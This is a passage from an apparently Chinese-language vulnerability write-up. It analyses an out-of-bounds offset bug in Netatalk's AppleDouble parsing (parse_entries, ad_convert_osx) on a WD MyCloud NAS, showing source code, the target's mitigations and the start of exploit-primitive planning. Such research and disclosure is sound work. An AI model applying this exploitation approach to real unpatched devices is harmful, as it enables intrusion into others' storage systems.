        <span class="n">LOG</span><span class="p">(</span><span class="n">log_debug</span><span class="p">,</span> <span class="n">logtype_ad</span><span class="p">,</span> <span class="s">"ad_open_rf(</span><span class="se">\"</span><span class="s">%s</span><span class="se">\"</span><span class="s">): created adouble rfork, flushing: </span><span class="se">\"</span><span class="s">%s</span><span class="se">\"</span><span class="s">"</span><span class="p">,</span>
            <span class="n">path</span><span class="p">,</span> <span class="n">rfpath</span><span class="p">);</span>
        <span class="n">ad_flush</span><span class="p">(</span><span class="n">ad</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="cm">/* Read the adouble header */</span>
        <span class="n">LOG</span><span class="p">(</span><span class="n">log_debug</span><span class="p">,</span> <span class="n">logtype_ad</span><span class="p">,</span> <span class="s">"ad_open_rf(</span><span class="se">\"</span><span class="s">%s</span><span class="se">\"</span><span class="s">): reading adouble rfork: </span><span class="se">\"</span><span class="s">%s</span><span class="se">\"</span><span class="s">"</span><span class="p">,</span>
            <span class="n">path</span><span class="p">,</span> <span class="n">rfpath</span><span class="p">);</span>
        <span class="n">EC_NEG1_LOG</span><span class="p">(</span> <span class="n">ad_header_read_osx</span><span class="p">(</span><span class="n">rfpath</span><span class="p">,</span> <span class="n">ad</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">st</span><span class="p">)</span> <span class="p">);</span>
    <span class="p">}</span>
<span class="cp">#endif
</span></pre></table></code></div></div><p>我们终于来到了我们的漏洞函数：<code class="language-plaintext highlighter-rouge">ad_header_read_osx()</code>。</p><h2 id="b-理解漏洞">B. 理解漏洞</h2><p><code class="language-plaintext highlighter-rouge">ad_header_read_osx()</code>函数读取资源fork文件的内容，也就是将文件内容根据AppleDouble格式进行理解。Netatalk根据AppleDouble格式，将格式中的各个元素保存进程序定义的<code class="language-plaintext highlighter-rouge">adouble</code>数据结构当中，该结构将在下文中详解。<code class="language-plaintext highlighter-rouge">ad_header_read_osx()</code>函数开始读取AppleDouble头部来判断该资源fork文件有多少个entry。</p><div lang="c++" class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="c1">//netatalk-3.1.12/libatalk/adouble/ad_open.c</span>
<span class="cm">/* Read an ._ file, only uses the resofork, finderinfo is taken from EA */</span>
<span class="k">static</span> <span class="kt">int</span> <span class="nf">ad_header_read_osx</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">,</span> <span class="k">struct</span> <span class="nc">adouble</span> <span class="o">*</span><span class="n">ad</span><span class="p">,</span> <span class="k">const</span> <span class="k">struct</span> <span class="nc">stat</span> <span class="o">*</span><span class="n">hst</span><span class="p">)</span>
<span class="p">{</span>
    <span class="p">...</span>
    <span class="k">struct</span> <span class="nc">adouble</span>      <span class="n">adosx</span><span class="p">;</span>
    <span class="p">...</span>
    <span class="n">LOG</span><span class="p">(</span><span class="n">log_debug</span><span class="p">,</span> <span class="n">logtype_ad</span><span class="p">,</span> <span class="s">"ad_header_read_osx: %s"</span><span class="p">,</span> <span class="n">path</span> <span class="o">?</span> <span class="n">fullpathname</span><span class="p">(</span><span class="n">path</span><span class="p">)</span> <span class="o">:</span> <span class="s">""</span><span class="p">);</span>
    <span class="n">ad_init_old</span><span class="p">(</span><span class="o">&amp;</span><span class="n">adosx</span><span class="p">,</span> <span class="n">AD_VERSION_EA</span><span class="p">,</span> <span class="n">ad</span><span class="o">-&gt;</span><span class="n">ad_options</span><span class="p">);</span>
    <span class="n">buf</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">adosx</span><span class="p">.</span><span class="n">ad_data</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">adosx</span><span class="p">.</span><span class="n">ad_data</span><span class="p">));</span>
    <span class="n">adosx</span><span class="p">.</span><span class="n">ad_rfp</span><span class="o">-&gt;</span><span class="n">adf_fd</span> <span class="o">=</span> <span class="n">ad_reso_fileno</span><span class="p">(</span><span class="n">ad</span><span class="p">);</span>

    <span class="cm">/* read the header */</span>
    <span class="n">EC_NEG1</span><span class="p">(</span> <span class="n">header_len</span> <span class="o">=</span> <span class="n">adf_pread</span><span class="p">(</span><span class="n">ad</span><span class="o">-&gt;</span><span class="n">ad_rfp</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">AD_DATASZ_OSX</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="p">);</span>
    <span class="p">...</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">adosx</span><span class="p">.</span><span class="n">ad_magic</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">adosx</span><span class="p">.</span><span class="n">ad_magic</span><span class="p">));</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">adosx</span><span class="p">.</span><span class="n">ad_version</span><span class="p">,</span> <span class="n">buf</span> <span class="o">+</span> <span class="n">ADEDOFF_VERSION</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">adosx</span><span class="p">.</span><span class="n">ad_version</span><span class="p">));</span>
    <span class="n">adosx</span><span class="p">.</span><span class="n">ad_magic</span> <span class="o">=</span> <span class="n">ntohl</span><span class="p">(</span><span class="n">adosx</span><span class="p">.</span><span class="n">ad_magic</span><span class="p">);</span>
    <span class="n">adosx</span><span class="p">.</span><span class="n">ad_version</span> <span class="o">=</span> <span class="n">ntohl</span><span class="p">(</span><span class="n">adosx</span><span class="p">.</span><span class="n">ad_version</span><span class="p">);</span>
    <span class="p">...</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nentries</span><span class="p">,</span> <span class="n">buf</span> <span class="o">+</span> <span class="n">ADEDOFF_NENTRIES</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">nentries</span> <span class="p">));</span>
    <span class="n">nentries</span> <span class="o">=</span> <span class="n">ntohs</span><span class="p">(</span><span class="n">nentries</span><span class="p">);</span>
    <span class="n">len</span> <span class="o">=</span> <span class="n">nentries</span> <span class="o">*</span> <span class="n">AD_ENTRY_LEN</span><span class="p">;</span>
</pre></table></code></div></div><p>之后我们看到，该函数进入了<code class="language-plaintext highlighter-rouge">parse_entries()</code>函数来解析不同的AppleDouble entry。有意思的是，当<code class="language-plaintext highlighter-rouge">parse_entries()</code>函数失败时，程序只是在日志中记录该错误，但并没有退出：</p><div lang="c++" class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>    <span class="n">nentries</span> <span class="o">=</span> <span class="n">len</span> <span class="o">/</span> <span class="n">AD_ENTRY_LEN</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">parse_entries</span><span class="p">(</span><span class="o">&amp;</span><span class="n">adosx</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">nentries</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">LOG</span><span class="p">(</span><span class="n">log_warning</span><span class="p">,</span> <span class="n">logtype_ad</span><span class="p">,</span> <span class="s">"ad_header_read(%s): malformed AppleDouble"</span><span class="p">,</span>
            <span class="n">path</span> <span class="o">?</span> <span class="n">fullpathname</span><span class="p">(</span><span class="n">path</span><span class="p">)</span> <span class="o">:</span> <span class="s">""</span><span class="p">);</span>
    <span class="p">}</span>
</pre></table></code></div></div><p>如果我们仔细分析<code class="language-plaintext highlighter-rouge">parse_entries()</code>函数，我们可以看到，当以下几个条件之一发生时，函数返回错误：</p><ul><li>AppleDouble的“eid“是0<li>AppleDouble的“offset”越界<li>当“eid”不指向一个资源fork文件，且AppleDouble的“offset”加上data的长度之后越界</ul><p>我们知道，我们处理的是资源fork文件，因此第二个条件很有趣。简单来说，它意味着我们可以在fork文件中提供一个越界的AppleDouble “offset”值并让<code class="language-plaintext highlighter-rouge">parse_entries()</code>函数返回一个错误，但是<code class="language-plaintext highlighter-rouge">ad_header_read_osx()</code>函数忽略了这个错误，程序继续往下执行。</p><div lang="c++" class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
</pre><td class="rouge-code"><pre><span class="c1">//netatalk-3.1.12/libatalk/adouble/ad_open.c</span>
<span class="cm">/**
 * Read an AppleDouble buffer, returns 0 on success, -1 if an entry was malformatted
 **/</span>
<span class="k">static</span> <span class="kt">int</span> <span class="nf">parse_entries</span><span class="p">(</span><span class="k">struct</span> <span class="nc">adouble</span> <span class="o">*</span><span class="n">ad</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">uint16_t</span> <span class="n">nentries</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">uint32_t</span>   <span class="n">eid</span><span class="p">,</span> <span class="n">len</span><span class="p">,</span> <span class="n">off</span><span class="p">;</span>
    <span class="kt">int</span>        <span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="cm">/* now, read in the entry bits */</span>
    <span class="k">for</span> <span class="p">(;</span> <span class="n">nentries</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">;</span> <span class="n">nentries</span><span class="o">--</span> <span class="p">)</span> <span class="p">{</span>
        <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">eid</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">eid</span> <span class="p">));</span>
        <span class="n">eid</span> <span class="o">=</span> <span class="n">get_eid</span><span class="p">(</span><span class="n">ntohl</span><span class="p">(</span><span class="n">eid</span><span class="p">));</span>
        <span class="n">buf</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">eid</span> <span class="p">);</span>
        <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">off</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">off</span> <span class="p">));</span>
        <span class="n">off</span> <span class="o">=</span> <span class="n">ntohl</span><span class="p">(</span> <span class="n">off</span> <span class="p">);</span>
        <span class="n">buf</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">off</span> <span class="p">);</span>
        <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">len</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">len</span> <span class="p">));</span>
        <span class="n">len</span> <span class="o">=</span> <span class="n">ntohl</span><span class="p">(</span> <span class="n">len</span> <span class="p">);</span>
        <span class="n">buf</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">len</span> <span class="p">);</span>

        <span class="n">ad</span><span class="o">-&gt;</span><span class="n">ad_eid</span><span class="p">[</span><span class="n">eid</span><span class="p">].</span><span class="n">ade_off</span> <span class="o">=</span> <span class="n">off</span><span class="p">;</span>
        <span class="n">ad</span><span class="o">-&gt;</span><span class="n">ad_eid</span><span class="p">[</span><span class="n">eid</span><span class="p">].</span><span class="n">ade_len</span> <span class="o">=</span> <span class="n">len</span><span class="p">;</span>

        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">eid</span>
            <span class="o">||</span> <span class="n">eid</span> <span class="o">&gt;</span> <span class="n">ADEID_MAX</span>
            <span class="o">||</span> <span class="n">off</span> <span class="o">&gt;=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ad</span><span class="o">-&gt;</span><span class="n">ad_data</span><span class="p">)</span>
            <span class="o">||</span> <span class="p">((</span><span class="n">eid</span> <span class="o">!=</span> <span class="n">ADEID_RFORK</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">off</span> <span class="o">+</span> <span class="n">len</span> <span class="o">&gt;</span>  <span class="k">sizeof</span><span class="p">(</span><span class="n">ad</span><span class="o">-&gt;</span><span class="n">ad_data</span><span class="p">))))</span>
        <span class="p">{</span>
            <span class="n">ret</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
            <span class="n">LOG</span><span class="p">(</span><span class="n">log_warning</span><span class="p">,</span> <span class="n">logtype_ad</span><span class="p">,</span> <span class="s">"parse_entries: bogus eid: %u, off: %u, len: %u"</span><span class="p">,</span>
                <span class="p">(</span><span class="n">uint</span><span class="p">)</span><span class="n">eid</span><span class="p">,</span> <span class="p">(</span><span class="n">uint</span><span class="p">)</span><span class="n">off</span><span class="p">,</span> <span class="p">(</span><span class="n">uint</span><span class="p">)</span><span class="n">len</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>至此，有必要去了解设备开放了哪些漏洞利用的缓解措施，这样才能知道我们接下来需要绕过哪些限制，同时需要分析<code class="language-plaintext highlighter-rouge">parse_entries()</code>函数之后的代码来了解我们需要构建哪些漏洞利用原语。</p><h1 id="利用">利用</h1><h2 id="环境中的缓解措施">环境中的缓解措施</h2><p>检查设备操作系统的内核是否开放ASLR：</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>root@MyCloudPR4100 ~ # cat /proc/sys/kernel/randomize_va_space 
2
</pre></table></code></div></div><p>从<a href="https://docs.oracle.com/cd/E37670_01/E36387/html/ol_aslr_sec.html">这里</a>可知：</p><ul><li>0 - 禁用ASLR。当内核以norandmaps参数启动时，将应用该设置。<li>1 - 随机化栈地址、VDSO页地址以及共享内存区域地址。数据段的基地址位于可执行代码段末尾之后。<li>2 - 随机化栈地址、VDSO页地址、共享内存区域地址以及数据段地址。这是默认的设置。</ul><p>用<a href="https://github.com/Wenzel/checksec.py">checksec.py</a>脚本检查<code class="language-plaintext highlighter-rouge">afpd</code>二进制程序的缓解措施：</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>[*] '/home/cedric/pwn2own/firmware/wd_pr4100/_WDMyCloudPR4100_5.17.107_prod.bin.extracted/squashfs-root/usr/sbin/afpd'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
</pre></table></code></div></div><p>总结一下：</p><ul><li><code class="language-plaintext highlighter-rouge">afpd</code>：随机化<ul><li><code class="language-plaintext highlighter-rouge">.text</code>：可读/可执行<li><code class="language-plaintext highlighter-rouge">.data</code>：可读/可写</ul><li>共享库：随机化<li>堆：随机化<li>栈：随机化</ul><p>由于所有东西的地址都被随机化，因此我们需要一些信息泄露的利用原语来绕过ASLR。我们还需要研究，是否可以触发一条路径，使得偏移越界访问对漏洞利用有用。</p><h2 id="发现好用的漏洞利用原语">发现好用的漏洞利用原语</h2><p>让我们再来分析一下<code class="language-plaintext highlighter-rouge">ad_header_read_osx()</code>函数中的代码。这里假定前面讨论过的<code class="language-plaintext highlighter-rouge">parse_entries()</code>函数解析了一个存在越界偏移entry的AppleDouble文件。来看看再<code class="language-plaintext highlighter-rouge">parse_entries()</code>函数返回之后，我们还能做些什么。可以看到，假定<code class="language-plaintext highlighter-rouge">if (ad_getentrylen(&amp;adosx, ADEID_FINDERI) != ADEDLEN_FINDERI) {</code>条件成立，该函数最终会调用并进入<code class="language-plaintext highlighter-rouge">ad_convert_osx()</code>函数。</p><div lang="c++" class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre>    <span class="n">nentries</span> <span class="o">=</span> <span class="n">len</span> <span class="o">/</span> <span class="n">AD_ENTRY_LEN</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">parse_entries</span><span class="p">(</span><span class="o">&amp;</span><span class="n">adosx</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">nentries</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">LOG</span><span class="p">(</span><span class="n">log_warning</span><span class="p">,</span> <span class="n">logtype_ad</span><span class="p">,</span> <span class="s">"ad_header_read(%s): malformed AppleDouble"</span><span class="p">,</span>
            <span class="n">path</span> <span class="o">?</span> <span class="n">fullpathname</span><span class="p">(</span><span class="n">path</span><span class="p">)</span> <span class="o">:</span> <span class="s">""</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">ad_getentrylen</span><span class="p">(</span><span class="o">&amp;</span><span class="n">adosx</span><span class="p">,</span> <span class="n">ADEID_FINDERI</span><span class="p">)</span> <span class="o">!=</span> <span class="n">ADEDLEN_FINDERI</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">LOG</span><span class="p">(</span><span class="n">log_warning</span><span class="p">,</span> <span class="n">logtype_ad</span><span class="p">,</span> <span class="s">"Convert OS X to Netatalk AppleDouble: %s"</span><span class="p">,</span>
            <span class="n">path</span> <span class="o">?</span> <span class="n">fullpathname</span><span class="p">(</span><span class="n">path</span><span class="p">)</span> <span class="o">:</span> <span class="s">""</span><span class="p">);</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">retry_read</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">LOG</span><span class="p">(</span><span class="n">log_error</span><span class="p">,</span> <span class="n">logtype_ad</span><span class="p">,</span> <span class="s">"ad_header_read_osx: %s, giving up"</span><span class="p">,</span> <span class="n">path</span> <span class="o">?</span> <span class="n">fullpathname</span><span class="p">(</span><span class="n">path</span><span class="p">)</span> <span class="o">:</span> <span class="s">""</span><span class="p">);</span>
            <span class="n">errno</span> <span class="o">=</span> <span class="n">EIO</span><span class="p">;</span>
            <span class="n">EC_FAIL</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">retry_read</span><span class="o">++</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">ad_convert_osx</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">adosx</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">goto</span> <span class="n">reread</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">errno</span> <span class="o">=</span> <span class="n">EIO</span><span class="p">;</span>
        <span class="n">EC_FAIL</span><span class="p">;</span>
    <span class="p">}</span>
</pre></table></code></div></div><p>就像下面代码的注释中所声明的那样，<code class="language-plaintext highlighter-rouge">ad_convert_osx()</code>函数负责将苹果AppleDouble文件格式转换为Netatalk实现的一个更为简单的格式。</p><p>可以看出，<code class="language-plaintext highlighter-rouge">ad_convert_osx()</code>函数一开始通过映射将原始的fork文件（基于AppleDouble文件格式）映射进内存当中。之后，该函数调用<code class="language-plaintext highlighter-rouge">memmove()</code>来丢弃掉FinderInfo部分的内容，并将剩余部分转移到该部分的开头。</p><div lang="c++" class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
</pre><td class="rouge-code"><pre><span class="c1">//netatalk-3.1.12/libatalk/adouble/ad_open.c</span>
<span class="cm">/**
 * Convert from Apple's ._ file to Netatalk
 *
 * Apple's AppleDouble may contain a FinderInfo entry longer then 32 bytes
 * containing packed xattrs. Netatalk can't deal with that, so we
 * simply discard the packed xattrs.
 *
 * As we call ad_open() which might result in a recursion, just to be sure
 * use static variable in_conversion to check for that.
 *
 * Returns -1 in case an error occured, 0 if no conversion was done, 1 otherwise
 **/</span>
<span class="k">static</span> <span class="kt">int</span> <span class="nf">ad_convert_osx</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">,</span> <span class="k">struct</span> <span class="nc">adouble</span> <span class="o">*</span><span class="n">ad</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">EC_INIT</span><span class="p">;</span>
    <span class="k">static</span> <span class="kt">bool</span> <span class="n">in_conversion</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">map</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">finderlen</span> <span class="o">=</span> <span class="n">ad_getentrylen</span><span class="p">(</span><span class="n">ad</span><span class="p">,</span> <span class="n">ADEID_FINDERI</span><span class="p">);</span>
    <span class="kt">ssize_t</span> <span class="n">origlen</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">in_conversion</span> <span class="o">||</span> <span class="n">finderlen</span> <span class="o">==</span> <span class="n">ADEDLEN_FINDERI</span><span class="p">)</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">in_conversion</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>

    <span class="n">LOG</span><span class="p">(</span><span class="n">log_debug</span><span class="p">,</span> <span class="n">logtype_ad</span><span class="p">,</span> <span class="s">"Converting OS X AppleDouble %s, FinderInfo length: %d"</span><span class="p">,</span>
        <span class="n">fullpathname</span><span class="p">(</span><span class="n">path</span><span class="p">),</span> <span class="n">finderlen</span><span class="p">);</span>

    <span class="n">origlen</span> <span class="o">=</span> <span class="n">ad_getentryoff</span><span class="p">(</span><span class="n">ad</span><span class="p">,</span> <span class="n">ADEID_RFORK</span><span class="p">)</span> <span class="o">+</span> <span class="n">ad_getentrylen</span><span class="p">(</span><span class="n">ad</span><span class="p">,</span> <span class="n">ADEID_RFORK</span><span class="p">);</span>

    <span class="n">map</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">origlen</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="n">ad_reso_fileno</span><span class="p">(</span><span class="n">ad</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">map</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">LOG</span><span class="p">(</span><span class="n">log_error</span><span class="p">,</span> <span class="n">logtype_ad</span><span class="p">,</span> <span class="s">"mmap AppleDouble: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
        <span class="n">EC_FAIL</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">memmove</span><span class="p">(</span><span class="n">map</span> <span class="o">+</span> <span class="n">ad_getentryoff</span><span class="p">(</span><span class="n">ad</span><span class="p">,</span> <span class="n">ADEID_FINDERI</span><span class="p">)</span> <span class="o">+</span> <span class="n">ADEDLEN_FINDERI</span><span class="p">,</span>
            <span class="n">map</span> <span class="o">+</span> <span class="n">ad_getentryoff</span><span class="p">(</span><span class="n">ad</span><span class="p">,</span> <span class="n">ADEID_RFORK</span><span class="p">),</span>
            <span class="n">ad_getentrylen</span><span class="p">(</span><span class="n">ad</span><span class="p">,</span> <span class="n">ADEID_RFORK</span><span class="p">));</span>
</pre></table></code></div></div><p>是时候来看看<code class="language-plaintext highlighter-rouge">adouble</code>结构体了。对于我们来说，其中重要的字段是<code class="language-plaintext highlighter-rouge">ad_eid[]</code>和<code class="language-plaintext highlighter-rouge">ad_data[]</code>。当AppleDouble文件被读取的时候，<code class="language-plaintext highlighter-rouge">adouble</code>结构体就被污染了。因此我们可以控制所有的这些字段。</p><div lang="c++" class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="c1">//netatalk-3.1.12/include/atalk/adouble.h</span>
<span class="k">struct</span> <span class="nc">ad_entry</span> <span class="p">{</span>
    <span class="kt">off_t</span>     <span class="n">ade_off</span><span class="p">;</span>
    <span class="kt">ssize_t</span>   <span class="n">ade_len</span><span class="p">;</span>
<span class="p">};</span>

<span class="k">struct</span> <span class="nc">adouble</span> <span class="p">{</span>
    <span class="kt">uint32_t</span>            <span class="n">ad_magic</span><span class="p">;</span>         <span class="cm">/* Official adouble magic                   */</span>
    <span class="kt">uint32_t</span>            <span class="n">ad_version</span><span class="p">;</span>       <span class="cm">/* Official adouble version number          */</span>
    <span class="kt">char</span>                <span class="n">ad_filler</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
    <span class="k">struct</span> <span class="nc">ad_entry</span>     <span class="n">ad_eid</span><span class="p">[</span><span class="n">ADEID_MAX</span><span class="p">];</span>

    <span class="p">...</span>
    <span class="kt">char</span>                <span class="n">ad_data</span><span class="p">[</span><span class="n">AD_DATASZ_MAX</span><span class="p">];</span>
<span class="p">};</span>
</pre></table></code></div></div><p>用来访问EID偏移、长度字段以及数据内容的函数/宏定义可以一眼看出：</p><ul><li><code class="language-plaintext highlighter-rouge">ad_getentryoff()</code>：获取一个EID偏移值<li><code class="language-plaintext highlighter-rouge">ad_getentrylen()</code>：获取一个EID长度值<li><code class="language-plaintext highlighter-rouge">ad_entry()</code>：获取EID对应的数据（通过上面的偏移来获取）</ul><div lang="c++" class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="c1">//netatalk-3.1.12/libatalk/adouble/ad_open.c</span>
<span class="kt">off_t</span> <span class="nf">ad_getentryoff</span><span class="p">(</span><span class="k">const</span> <span class="k">struct</span> <span class="nc">adouble</span> <span class="o">*</span><span class="n">ad</span><span class="p">,</span> <span class="kt">int</span> <span class="n">eid</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">ad</span><span class="o">-&gt;</span><span class="n">ad_vers</span> <span class="o">==</span> <span class="n">AD_VERSION2</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">ad</span><span class="o">-&gt;</span><span class="n">ad_eid</span><span class="p">[</span><span class="n">eid</span><span class="p">].</span><span class="n">ade_off</span><span class="p">;</span>

    <span class="k">switch</span> <span class="p">(</span><span class="n">eid</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">case</span> <span class="n">ADEID_DFORK</span><span class="p">:</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">ADEID_RFORK</span><span class="p">:</span>
<span class="cp">#ifdef HAVE_EAFD
</span>        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="cp">#else
</span>        <span class="k">return</span> <span class="n">ad</span><span class="o">-&gt;</span><span class="n">ad_eid</span><span class="p">[</span><span class="n">eid</span><span class="p">].</span><span class="n">ade_off</span><span class="p">;</span>
<span class="cp">#endif
</span>    <span class="nl">default:</span>
        <span class="k">return</span> <span class="n">ad</span><span class="o">-&gt;</span><span class="n">ad_eid</span><span class="p">[</span><span class="n">eid</span><span class="p">].</span><span class="n">ade_off</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="cm">/* deadc0de */</span>
    <span class="n">AFP_PANIC</span><span class="p">(</span><span class="s">"What am I doing here?"</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><div lang="c++" class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="c1">//netatalk-3.1.12/include/atalk/adouble.h</span>
<span class="cp">#define ad_getentrylen(ad,eid)     ((ad)-&gt;ad_eid[(eid)].ade_len)
#define ad_setentrylen(ad,eid,len) ((ad)-&gt;ad_eid[(eid)].ade_len = (len))
#define ad_setentryoff(ad,eid,off) ((ad)-&gt;ad_eid[(eid)].ade_off = (off))
#define ad_entry(ad,eid)           ((caddr_t)(ad)-&gt;ad_data + (ad)-&gt;ad_eid[(eid)].ade_off)
